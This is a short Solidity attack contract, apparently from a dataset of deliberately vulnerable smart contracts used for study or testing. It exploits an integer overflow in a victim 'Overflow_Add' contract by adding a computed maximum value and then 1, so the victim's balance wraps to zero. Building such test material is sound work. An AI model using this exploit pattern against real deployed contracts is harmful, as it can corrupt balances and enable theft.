pragma solidity 0.4.25;

import "../dataset/arithmetic/overflow_simple_add.sol";

contract Overflow_AddAttacker {
    Overflow_Add victimContract;

    constructor (address _victimAddress) public {
        victimContract = Overflow_Add(_victimAddress);
    }

    function attack() public {

        uint256 balance = victimContract.balance();
        uint256 max = 2**256 - 1 - balance;
        
        victimContract.add(max);
        victimContract.add(1);
    }
}